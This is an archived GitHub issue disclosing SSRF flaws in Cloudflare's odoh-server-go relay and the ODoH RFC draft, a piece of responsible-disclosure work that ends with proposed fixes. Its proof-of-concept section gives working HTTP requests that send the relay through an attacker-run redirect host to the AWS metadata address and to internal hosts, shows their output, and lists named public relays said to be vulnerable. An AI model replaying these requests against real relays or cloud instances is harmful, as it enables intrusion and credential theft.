---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-04-21_security-issues-with-cloudflareodoh-server-go-and-the-odoh-rfc-draft.md
original_filename: 2022-04-21_security-issues-with-cloudflareodoh-server-go-and-the-odoh-rfc-draft.md
title: Security issues with cloudflare/odoh-server-go and the ODoH RFC draft
category: documents
detected_topics:
- ssrf
- command-injection
- automation-abuse
- api-security
- cloud-security
tags:
- imported
- documents
- ssrf
- command-injection
- automation-abuse
- api-security
- cloud-security
language: en
raw_sha256: 5bffda73a081a8ba8758fd626dcde018c782f620d82844109b661ef41167abfb
text_sha256: 6954b1abbc437cdaad13ec78c59f8f451a45b488781333dfd346533a5f1a7220
ingested_at: '2026-06-28T07:32:11Z'
sensitivity: unknown
redactions_applied: false
---

# Security issues with cloudflare/odoh-server-go and the ODoH RFC draft

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-04-21_security-issues-with-cloudflareodoh-server-go-and-the-odoh-rfc-draft.md
- Source Type: markdown
- Detected Topics: ssrf, command-injection, automation-abuse, api-security, cloud-security
- Ingested At: 2026-06-28T07:32:11Z
- Redactions Applied: False
- Raw SHA256: `5bffda73a081a8ba8758fd626dcde018c782f620d82844109b661ef41167abfb`
- Text SHA256: `6954b1abbc437cdaad13ec78c59f8f451a45b488781333dfd346533a5f1a7220`


## Content

---
title: "Security issues with cloudflare/odoh-server-go and the ODoH RFC draft"
page_title: "Security issues with cloudflare/odoh-server-go and the ODoH RFC draft · Issue #30 · cloudflarearchive/odoh-server-go · GitHub"
url: "https://github.com/cloudflare/odoh-server-go/issues/30"
final_url: "https://github.com/cloudflarearchive/odoh-server-go/issues/30"
authors: ["Frans Rosén (@fransrosen)"]
programs: ["Cloudflare"]
bugs: ["SSRF"]
publication_date: "2022-04-21"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2691
---

###  Uh oh! 

There was an error while loading. [Please reload this page]().

[ cloudflarearchive ](/cloudflarearchive) / **[odoh-server-go](/cloudflarearchive/odoh-server-go) ** Public

  * [ Notifications ](/login?return_to=%2Fcloudflarearchive%2Fodoh-server-go) You must be signed in to change notification settings
  * [ Fork 14 ](/login?return_to=%2Fcloudflarearchive%2Fodoh-server-go)
  * [ Star  66 ](/login?return_to=%2Fcloudflarearchive%2Fodoh-server-go)

  * [ Code ](/cloudflarearchive/odoh-server-go)
  * [ Issues 10 ](/cloudflarearchive/odoh-server-go/issues)
  * [ Pull requests 1 ](/cloudflarearchive/odoh-server-go/pulls)
  * [ Actions ](/cloudflarearchive/odoh-server-go/actions)
  * [ Projects ](/cloudflarearchive/odoh-server-go/projects)
  * [ Security and quality 0 ](/cloudflarearchive/odoh-server-go/security)
  * [ Insights ](/cloudflarearchive/odoh-server-go/pulse)

Additional navigation options

  * [ Code  ](/cloudflarearchive/odoh-server-go)
  * [ Issues  ](/cloudflarearchive/odoh-server-go/issues)
  * [ Pull requests  ](/cloudflarearchive/odoh-server-go/pulls)
  * [ Actions  ](/cloudflarearchive/odoh-server-go/actions)
  * [ Projects  ](/cloudflarearchive/odoh-server-go/projects)
  * [ Security and quality  ](/cloudflarearchive/odoh-server-go/security)
  * [ Insights  ](/cloudflarearchive/odoh-server-go/pulse)

# Security issues with cloudflare/odoh-server-go and the ODoH RFC draft #30

New issue

Copy link

New issue

Copy link

Open

Open

Security issues with cloudflare/odoh-server-go and the ODoH RFC draft#30

Copy link

## Description

[![@fransr](https://avatars.githubusercontent.com/u/402210?u=0d5b2320811cf91d45c1084c78c82a099f887ebb&v=4&size=48)](https://github.com/fransr)

[fransr](https://github.com/fransr)

opened [on Apr 21, 2022](https://github.com/cloudflarearchive/odoh-server-go/issues/30#issue-1211338206)

Issue body actions

Hi,

_Disclaimer: I was told by Cloudflare after reporting this to them at<https://hackerone.com/cloudflare> to also report this publicly in this project. Report ID: #1544311 (Not disclosed yet)_

> You can also file an issue on Github for this project.

### Background information

I've been doing some research around ODoH (Oblivious DNS Over HTTPS) and I've identified some issues with the ongoing and running project at [cloudflare/odoh-server-go](https://github.com/cloudflare/odoh-server-go) as well as some issues with the RFC-draft itself lacking important security considerations.

Due to the RFC lacking the security considerations, my assumption is that the project at [cloudflare/odoh-server-go](https://github.com/cloudflare/odoh-server-go) was written without any sort of protections for SSRF in mind, causing the current state of the project allowing full and valid POST/GET-requests with valid Content-type-headers to be made to any HTTP or HTTPS-endpoints, including internal hosts from the endpoint running the application.

First, I saw the article explaining [Cloudflare's and 1.1.1.1's approach to add support for ODoH](https://blog.cloudflare.com/oblivious-dns/)

In this article, there are three partners mentioned that are currently running ODoH-relays:

  * PCCW Global
  * Equinix
  * SURF

[![image3-8](https://user-images.githubusercontent.com/402210/164514953-1076283f-bebd-4aa0-93bb-cd8b019a6612.png)](https://user-images.githubusercontent.com/402210/164514953-1076283f-bebd-4aa0-93bb-cd8b019a6612.png)

### Technical description

If you don't know the concept of ODoH, the idea is that the DNS-lookup is made against a relay using encrypted data, which then proxies the information over to the target host. Since the payload is encrypted, the proxy doesn't really know what the payload contains. Also, the response from the target host will also be encrypted, so the proxy don't know what is being returned by the target and will send it unmodified to the client. This is all as per design.

However, there are no security mitigations for abusing this ODoH-relay to issue requests against other types of hosts, as well as internal hosts only reachable by the ODoH-relay. This means you can actually abuse the ODoH-relay for SSRF (Server-Side Request Forgery). The [RFC-draft specification](https://datatracker.ietf.org/doc/draft-pauly-dprive-oblivious-doh/) does mention some restrictions, and I know you were a part of writing the specification together with Apple, so this is why I will also add some considerations to this report:

  1. Restrict content-type used in the request from the Client

> Clients MUST set the HTTP Content-Type header to "application/  
>  oblivious-dns-message" to indicate that this request is an Oblivious  
>  DoH query intended for proxying. Clients also SHOULD set this same  
>  value for the HTTP Accept header.

This is not being restricted in the _cloudflare/odoh-server-go_ -project. Any content-type will be allowed to be sent and will be passed on to the target.

  2. Restrict content-type used in the response from the Target

> Upon receipt of requests from a Proxy, Targets MUST validate that the  
>  request has the HTTP Content-Type header "application/oblivious-dns-  
>  message" and uses the HTTP POST method. Targets can respond with a  
>  4xx response status code if this check fails.

I think this is not properly worded and is probably the reason why the _cloudflare/odoh-server-go_ -project allows any content-type to be returned from the target. **I would modify this to also include that the`Proxy MUST validate that the response from the Target has the HTTP Content-Type header "application/oblivious-dns-message"`**. This is not being restricted in the _cloudflare/odoh-server-go_ -project. Any content-type will be allowed to be returned by the target and will be passed on to the client.

  3. Prevent redirects to non HTTPS-protocols

> The scheme  
>  for both the Proxy URI Template and the Target URI MUST be "https".

This is not being restricted in the _cloudflare/odoh-server-go_ -project. You can use a redirect endpoint on HTTPS to redirect the request to a `http://`-URL and the proxy will follow the redirect blindly. **I would also add to the specification that`The Proxy is NOT allowed to follow any HTTP-redirects at all.`** as that would prevent `http`-protocol from being used at all.

There is also a mention about some mitigations that the proxy MAY do:

  4. Ability to configure to block invalid ports from being used

> Proxies MAY choose to not forward connections to non-standard ports.  
>  In such cases, Proxies can indicate the error with a 403 response  
>  status code, along with a Proxy-Status response header with an  
>  "error" parameter of type "http_request_denied", along with an  
>  appropriate explanation in "details".

This is not being restricted in the _cloudflare/odoh-server-go_ -project and is not possible to configure either.

In addition to these points, there's no mitigation against using internal IPs being provided to the `targethost` (or redirecting from a valid `targethost` to an internal one) which is why we can confirm that we can read data from internal hosts. This is never mentioned as a security consideration in the RFC-draft. There's actually nothing mentioning the issue of the ODoH-relay being vulnerable to SSRF at all in the "Security considerations" of the draft. I agree that some things in the RFC-draft does prevent at least leaking data to the client if the content-type response of the target is not the proper one, but a request would still be made to the target host. I've mentioned these before as [SSRF-canaries](https://twitter.com/fransrosen/status/1349397387920502786) where you're able to make a request to an internal service that would make some form of DNS-lookup or request externally, which would help you fingerprint and confirm that you're able to reach the internal host.

  5. Ability to (or default always) block internal hosts from being used as `targethost`

I would recommend to block requests being made to any internal hosts (where the IP-range is reserved for internal use). This could be configured to be allowed if needed, but should be default blocking. It also needs to handle redirects, so the attacker cannot redirect from a public host to an internal one. Here's an [article by Andrew Ayer explaining the issue in relation to Go](https://www.agwa.name/blog/post/preventing_server_side_request_forgery_in_golang) that might be helpful to understand the problem.

### PoC

I've also confirmed that if I run the _cloudflare/odoh-server-go_ -project on a EC2 without enabling [IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html), I can reach the internal AWS-metadata which could give me access to security-credentials for the running instance:
  
  
  POST /proxy?targethost=attacker.fransrosen.com&targetpath=/redir.php?c=301%26ip=http://169.254.169.254/ HTTP/2
  Host: victim-running-odoh.fransrosen.com
  Accept: application/oblivious-dns-message
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 25
  
  AAA

The reason why we use a redirect is because the `targethost` is always using `https://`-protocol, but the AWS metadata is only being returned on `http://`. It's also good to know that the request that is being made by the _odoh-server-go_ -project is following redirects blindly. The request above will make a POST-request to `https://attacker.fransrosen.com/redir.php?c=301&ip=http://169.254.169.254` that will response with a status 301-response which will then make the proxy do a GET-request to `http://169.254.169.254` and will return with the content from the response:
  
  
  HTTP/2 200 OK
  Content-Type: application/oblivious-dns-message
  Content-Length: 285
  Date: Tue, 19 Apr 2022 07:36:21 GMT
  
  1.0
  2007-01-19
  2007-03-01
  2007-08-29
  2007-10-10
  2007-12-15
  2008-02-01
  ...

We can also redirect the user using 307-status to maintain the POST-payload over to a HTTP-url. We can also issue legit POST-request to any host with the proper content-type that we want to use against the victim host:
  
  
  POST /proxy?targethost=attacker.fransrosen.com&targetpath=/redir.php?c=307%26ip=http://test-host:8080/ HTTP/2
  Host: victim-running-odoh.fransrosen.com
  Accept: application/oblivious-dns-message
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 25
  
  data=xxx&another-data=zzz

This will make a POST-request to `https://attacker.fransrosen.com/redir.php?c=307&ip=http://test-host:8080` which will return with a 307 and redirect the POST-request instead to `http://test-host:8080`and send the same `Content-type` that was being used:
  
  
  Connection from [0.0.0.0] port 8080 [tcp/http-alt] accepted (family 2, sport 54481)
  POST / HTTP/1.1
  Host: 0.0.0.0
  User-Agent: Go-http-client/1.1
  Content-Length: 25
  Content-Type: application/x-www-form-urlencoded
  Accept-Encoding: gzip
  
  data=xxx&another-data=zzz

Same with JSON obviously:
  
  
  POST /proxy?targethost=attacker.fransrosen.com&targetpath=/redir.php?c=307%26ip=http://test-host:8080/ HTTP/2
  Host: victim-running-odoh.fransrosen.com
  Accept: application/oblivious-dns-message
  Content-Type: application/json
  Content-Length: 25
  
  {"hello": "test"}

will make the following request to `http://test-host:8080`:
  
  
  Connection from [0.0.0.0] port 8080 [tcp/http-alt] accepted (family 2, sport 46026)
  POST / HTTP/1.1
  Host: 0.0.0.0
  User-Agent: Go-http-client/1.1
  Content-Length: 17
  Content-Type: application/json
  Accept-Encoding: gzip
  
  {"hello": "test"}

As mentioned above, you can run the _cloudflare/odoh-server-go_ on an EC2 on AWS without IMDSv2 enabled, and then make the following request to the application, using a redirect endpoint as the `targethost` to redirect the request to `http://169.254.169.254`:
  
  
  POST /proxy?targethost=your-redirect-page.example&targetpath=/redirect?url=http://169.254.169.254/ HTTP/2
  Host: victim-running-odoh.example
  Accept: application/oblivious-dns-message
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 3
  
  AAA

And you should get the AWS-metadata listing back in the response.

[![Screen_Shot_2022-04-19_at_09 47 16](https://user-images.githubusercontent.com/402210/164515466-559c3098-c225-4e4f-b173-e928c2f61d69.png)](https://user-images.githubusercontent.com/402210/164515466-559c3098-c225-4e4f-b173-e928c2f61d69.png)

### Mitigations

I've confirmed that all three partners mentioned in the article are indeed running _cloudflare/odoh-server-go_ at:
  
  
  https://proxy.odoh.cloudflare-dns.com/ (Expired cert, but service still works if you go pass that cert-error, run by Equinix)
  https://proxy-ny.odoh.cloudflare-dns.com/ (Expired cert, but service still works if you go pass that cert-error, run by Equinix)
  https://asia.odoh.edge.pccwglobal.net/ (PCCW Global)
  https://odoh1.surfdomeinen.nl/ (SURF)
  

And they all have the issues mentioned in this report. I have **not** tested any internal hosts on them, only confirmed that they are running the same project and that they are giving me back arbitrary content without validating the content-type from the target response, as well as allowing any content-type to be set in the request which will also be received by the target host. There are obviously more places this _cloudflare/odoh-server-go_ is running that are also vulnerable to the same issues.

Proper mitigations would be to:

  1. Restrict content-type used in the request from the Client
  2. Restrict content-type used in the response from the Target
  3. Prevent redirects to non HTTPS-protocols
  4. Ability to configure to block invalid ports from being used
  5. Ability to (or default always) block internal hosts from being used as `targethost`

Regards,  
Frans Rosén

Reactions are currently unavailable

## Metadata

## Metadata

### Assignees

No one assigned

### Labels

No labels

No labels

### Type

No type

### Fields

[Give feedback](https://github.com/orgs/community/discussions/189141)

No fields configured for issues without a type.

### Projects

No projects

### Milestone

No milestone

### Relationships

None yet

### Development

No branches or pull requests

## Issue actions
